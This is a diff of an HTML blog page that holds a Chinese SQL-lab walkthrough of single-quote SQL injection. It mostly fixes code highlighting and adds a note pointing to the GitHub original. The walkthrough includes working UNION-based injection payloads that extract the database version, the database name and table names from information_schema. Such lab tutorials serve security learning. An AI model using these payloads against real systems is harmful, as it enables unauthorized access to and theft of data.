@@ -474,7 +474,8 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SQL-lab"><a href="#SQL-lab" class="headerlink" title="SQL-lab"></a>SQL-lab</h1><p>sql注入全部解析</p>
+                <p>注意:由于某些原因，代码高亮有些混合，去github查看原版</p>
+<h1 id="SQL-lab"><a href="#SQL-lab" class="headerlink" title="SQL-lab"></a>SQL-lab</h1><p>sql注入全部解析</p>
 <h2 id="1-单引号字符型注入"><a href="#1-单引号字符型注入" class="headerlink" title="1. 单引号字符型注入"></a>1. 单引号字符型注入</h2><ul>
 <li><ol>
 <li>先看题，要求输入一个数字</li>
@@ -505,17 +506,15 @@
 <p>现在我们就可以查到我们想要的内容</p>
 </blockquote>
 <ul>
-<li>查询数据库版本和库名称<br>```sql</li>
+<li>查询数据库版本和库名称</li>
 </ul>
-<p>-1’ union select 1,version,database() –+//要让前边为错“-1”，不让数据库执行前边的语句</p>
-<pre><code>
-![image](https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png)
-
-
-
-* 查询表名
-```sql
--1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+//group_concat,查询显示所有结果
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//要让前边为错“-1”，不让数据库执行前边的语句</span>
+</code></pre>
+<p><img src="https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png" alt="image"></p>
+<ul>
+<li>查询表名</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//group_concat,查询显示所有结果</span>
 </code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114822963-690dea00-9df5-11eb-962c-c757254f70e4.png" alt="image"></p>
 <ul>
